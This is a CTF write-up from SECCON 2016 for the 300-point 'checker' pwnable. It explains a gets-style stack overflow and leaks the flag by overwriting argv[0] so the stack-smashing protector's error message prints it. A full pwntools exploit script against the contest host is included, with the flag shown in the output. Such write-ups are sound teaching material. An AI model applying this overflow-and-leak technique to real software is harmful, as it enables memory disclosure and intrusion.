---
title: SECCON CTF 2016 -- checker
tags:
  - SECCON
  - CTF
  - BOF
  - Pwnable
  - Python
categories:
  - write-ups
date: 2016-12-12 08:02:00
---
**Category:** Exploit
**Points:** 300

<!-- more -->  

64 bit ELF with Full RELRO, stack canary, NX enabled, No PIE.  

A quick run of the program: 
```
$ ./checker 
Hello! What is your name?
NAME : 123

Do you know flag?
>> 123

Do you know flag?
>> yes

Oh, Really??
Please tell me the flag!
FLAG : asdf
You are a liar...
```

By reversing the binary, we found that the program use a function named `getaline()` to read the user input. 
```c getaline
while ( buf && read(0, &buf, 1uLL) )
{
    if ( buf == 10 )
        buf = 0;
    *(_BYTE *)(a1 + (signed int)v4++) = buf; // a1 = input buffer
}
```
We can see that the `getaline()` function is just like `gets()` in `stdio.h`, so the program itself has multiple stack overflow vulnerabilities.   

```
$ ./checker
Hello! What is your name?
NAME : 123

Do you know flag?
>> yes

Oh, Really??
Please tell me the flag!
FLAG : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You are a liar...
*** stack smashing detected ***: ./checker terminated
[1]    70548 abort      ./checker
```

Although we can easily overwrite the return address, however the program has the stack smashing protector (SSP) enabled. Luckliy, the program will read the flag's content and stored it into a buffer which lies in the `.bss` section before entering the main function. So, we can try to **overwrite the content of `argv[0]` ( which stores a `char*` pointer of the program file path ) into the flag buffer's address**. Then, we smash the stack and trigger the SSP, which will then output the following error message: 
```
*** stack smashing detected ***: [flag content] terminated
```

Notice that the original content of `argv[0]` stores a 6 bytes memory address, while the flag's buffer address is 3 bytes (`0x6010c0`). So we'll have to null out the `argv[0]` first before we change it into `0x6010c0`, or else it will crash the program before it was able to output the error message.  
```python exp_checker.py
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = "checker.pwn.seccon.jp"
PORT = 14726
ELF_PATH = "./checker"
LIBC_PATH = ""

# setting 
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

elf = ELF(ELF_PATH)
#libc = ELF(LIBC_PATH)

def my_recvuntil(s, delim):
    res = ""
    while delim not in res:
        c = s.recv(1)
        res += c
        sys.stdout.write(c)
        sys.stdout.flush()
    return res

def myexec(cmd):
    return subprocess.check_output(cmd, shell=True)


if __name__ == "__main__":

    r = remote(HOST, PORT)
    #r = process(ELF_PATH)

    pad = 0x178

    r.sendlineafter(": ", "aaaa")
    
    # null out argv[0]
    for i in xrange(8,-1,-1):
        payload = "A"*pad + "B"*i
        r.sendlineafter(">> ", payload)
    
    r.sendlineafter(">> ", "yes")

    # overwrite argv[0] to flag buffer
    payload = "A"*pad + p64(0x6010c0)
    
    r.sendlineafter(": ", payload)
    r.interactive()
    
```

Although the exploit works on the local machine, it failed to work on the remote side. I sent the payload for like a hundred times and it just won't give me the flag. It really frustrated me at that moment because I was so close to capture the flag and the contest is about to end in 5 minutes......  

But there's nothing more I can do, so I just keep sending the same payload again and again, hoping that  it will work at the end of the contest. And then, something amazing happened...
```
[+] Opening connection to checker.pwn.seccon.jp on port 14726: Done
You are a liar...
*** stack smashing detected ***: SECCON{y0u_c4n'7_g37_4_5h3ll,H4h4h4} terminated
[*] Got EOF while reading in interactive
```

lol WTF ? 

I still don't know why it will work at the very end of the contest until now ! I mean it's the same payload ! How is this even possible ? Anyway I managed to submit the flag right before the end of the contest and get the damn 300 points ... What an end @_@!  

flag: `SECCON{y0u_c4n'7_g37_4_5h3ll,H4h4h4}`